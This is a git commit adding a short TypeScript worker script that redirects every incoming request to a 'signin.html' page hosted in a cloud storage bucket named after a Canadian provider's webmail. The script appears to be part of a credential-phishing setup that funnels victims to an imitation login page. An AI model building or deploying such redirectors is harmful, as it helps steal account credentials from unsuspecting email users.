2288f71c3fb1d5567082caf20c16d592c9b468da
temimcojo-byte <temimcojo@gmail.com>
2026-02-17 09:51:36 +0100

    Create main.ts

---
+++ main.ts
@@ -0,0 +1,16 @@
+// main.ts
+
+// Define the redirect URL
+const redirectUrl = "https://webmail-shaw-ca.s3.us-east-005.backblazeb2.com/signin.html"; // Replace with the URL you want to redirect to
+
+// Handle the request
+addEventListener("fetch", (event) => {
+  event.respondWith(
+    new Response(null, {
+      status: 302, // HTTP status for redirection
+      headers: {
+        "Location": redirectUrl, // The URL to redirect to
+      },
+    })
+  );
+});
